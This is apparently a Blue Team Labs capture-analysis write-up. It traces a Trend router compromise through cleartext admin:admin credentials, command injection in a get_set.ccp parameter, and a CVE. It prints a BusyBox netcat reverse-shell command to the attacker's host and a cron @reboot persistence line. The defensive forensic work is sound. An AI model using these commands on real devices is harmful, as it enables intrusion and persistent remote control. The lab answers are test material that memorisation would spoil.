# Investigation Submission – Trend Router Compromise (BTLO)

---

## 1) Router IP Address

**Question:**  
As the SOC analyst investigating the alert, what is the IP address of the router where the alert originated?

**Investigation:**  
The PCAP was first reviewed at a high level to understand source and destination communication patterns.  
By inspecting HTTP traffic between internal hosts, the destination IP consistently receiving management requests was identified as the router.

**Answer:**  
`192.168.10.1`

**Evidence:**  
<img width="1031" height="432" alt="attacker-source-ip-" src="https://github.com/user-attachments/assets/19085863-e75b-4dcc-b9af-fdd198f7d070" />

---

## 2) Router Model and Firmware Version

**Question:**  
What is the router’s model number and version?

**Investigation:**  
After identifying the router IP, HTTP responses from the web management interface were inspected.  
Pages served by the router exposed device metadata, including model and firmware version information, which is typical for embedded web interfaces.

**Answer:**  
Trend router – model and firmware details disclosed via the HTTP management interface.

**Evidence:**  
<img width="1034" height="684" alt="device-model-details" src="https://github.com/user-attachments/assets/1fa79866-1008-46d6-bf53-4f6ecbdbb9e8" />  
<img width="1538" height="831" alt="device-firmware-version" src="https://github.com/user-attachments/assets/6e7fec7f-dab8-4ca6-b33d-7ed8de14a503" />

---

## 3) Compromised Credentials

**Question:**  
Can you identify the username and password the attacker used to gain access?

**Investigation:**  
HTTP POST requests to the login endpoint were isolated and reconstructed using **Follow → TCP Stream**.  
Because the management interface did not use HTTPS, credentials were visible in cleartext within the HTTP payload.

**Answer:**  
`admin:admin`

**Evidence:**  
<img width="1024" height="833" alt="login-cleartext-credentials" src="https://github.com/user-attachments/assets/7449e646-5147-497b-93bc-673cc96b6f9b" />

---

## 4) Attacker Machine IP Address

**Question:**  
Determine the IP address of the machine the attacker used to exploit the router’s firmware.

**Investigation:**  
The source IP address of the malicious HTTP POST requests was reviewed.  
All exploitation traffic originated from the same internal host.

**Answer:**  
`192.168.10.2`

**Evidence:**  
<img width="1031" height="432" alt="attacker-source-ip-" src="https://github.com/user-attachments/assets/19085863-e75b-4dcc-b9af-fdd198f7d070" />

---

## 5) Vulnerable Endpoint

**Question:**  
What is the full URL of the compromised endpoint?

**Investigation:**  
HTTP POST requests were filtered using:

http.request.method == "POST"
Repeated requests targeting a specific configuration endpoint were observed during exploitation.

**Answer:**  
http://192.168.10.1/get_set.ccp
**Evidence:**  
<img width="930" height="136" alt="vulnerable-endpoint-get-set-ccp" src="https://github.com/user-attachments/assets/e5596e2f-5ec2-4eb3-a503-bd540f3cfb95" />

---

## 6) Manipulated Parameter

**Question:**  
Which parameter was manipulated to exploit the system?

**Investigation:**  
POST payloads to `/get_set.ccp` were inspected.  
One configuration parameter contained injected shell commands, indicating insufficient input sanitisation.

**Answer:**  
lanHostCfg_HostName_1.1.1.0
**Evidence:**  
<img width="1538" height="836" alt="command-injectionparameter" src="https://github.com/user-attachments/assets/9495d035-df83-423b-8aa3-e5c9677cd6ac" />

---

## 7) CVE Identification

**Question:**  
Identify the specific CVE used in this incident.

**Investigation:**  
The vulnerability pattern observed (unauthenticated/weakly authenticated command injection via router configuration parameters) matches a known Trend router command injection vulnerability.

**Answer:**  
CVE-2019-11399 
*(Trend router command injection via get_set.ccp parameter)*

---

## 8) First Command Executed

**Question:**  
What was the first command executed on the router firmware?

**Investigation:**  
Injected commands were reconstructed from the HTTP POST payloads.  
The earliest confirmed command execution created a directory on the filesystem.

**Answer:**  
mkdir test
**Evidence:**  
<img width="1516" height="838" alt="initial-command-mkdir-test" src="https://github.com/user-attachments/assets/30f21a2e-2bf2-4b00-827b-f660c053f1b1" />

---

## 9) Initial Exploitation Timestamp

**Question:**  
What is the exact timestamp when the CVE was first exploited?

**Investigation:**  
The timestamp of the first malicious POST request containing injected commands was identified by correlating packet timestamps in Wireshark.

**Answer:**  
`2025-01-22 14:41:12`

---

## 10) Reverse Shell Command

**Question:**  
What command was used to successfully establish the reverse shell?

**Investigation:**  
Multiple failed attempts were observed before a successful payload using BusyBox netcat.

**Answer:**  
busybox nc 192.168.10.2 4444 -e /bin/sh
**Evidence:**  
<img width="1512" height="813" alt="reverse-shell-command" src="https://github.com/user-attachments/assets/3b43369e-f784-411c-bc61-b1f272640acc" />

---

## 11) Reverse Shell Connection Timestamp

**Question:**  
What is the exact timestamp when the reverse shell was successfully established?

**Investigation:**  
A TCP connection to port `4444` was identified.  
The first successful SYN/ACK exchange marks the establishment of the reverse shell.

**Answer:**  
`2025-01-22 14:42:25`

**Evidence:**  
<img width="1531" height="225" alt="tcp-4444-reverse-shell-established" src="https://github.com/user-attachments/assets/0783f043-ff72-4463-be51-dea142226aff" />

---

## 12) First Post-Exploitation Command

**Question:**  
What was the first command executed after establishing the reverse shell?

**Investigation:**  
Commands issued immediately after shell access were reconstructed from the TCP stream.

**Answer:**  
whoami
**Evidence:**  
<img width="1549" height="842" alt="post-exploitation-whoami" src="https://github.com/user-attachments/assets/6074172d-a1db-40de-b2b7-b1e2994e13dd" />

---

## 13) Persistence Command

**Question:**  
What command was used to maintain persistence?

**Investigation:**  
The attacker modified cron configuration to ensure execution on reboot.

**Answer:**  
@reboot /tmp/shell.sh
**Evidence:**  
<img width="1044" height="828" alt="cron-persistence-reboot" src="https://github.com/user-attachments/assets/522245cd-c51a-4f38-9a78-aa44fbce7dd9" />

---
